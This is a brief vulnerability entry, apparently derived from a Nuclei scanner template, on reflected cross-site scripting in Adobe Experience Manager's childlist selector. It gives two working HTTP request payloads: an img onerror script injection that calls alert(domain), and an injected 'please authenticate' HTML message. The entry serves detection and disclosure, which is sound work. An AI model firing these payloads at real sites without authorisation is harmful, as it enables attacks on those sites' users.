# Vulnerability: Adobe Experience Manager Childlist Selector - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`aem-childrenlist-xss.yaml`)

## Description
Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the childlist selector when a dispatcher does not respect the content type responded by AEM and flips from application/json to text/html. As a consequence, the reflected suffix is executed and interpreted in the browser.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/{{rand_base(4)}}<img src=x data'a'onerror=alert(domain)>.childrenlist.html
GET {{BaseURL}}/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html
```

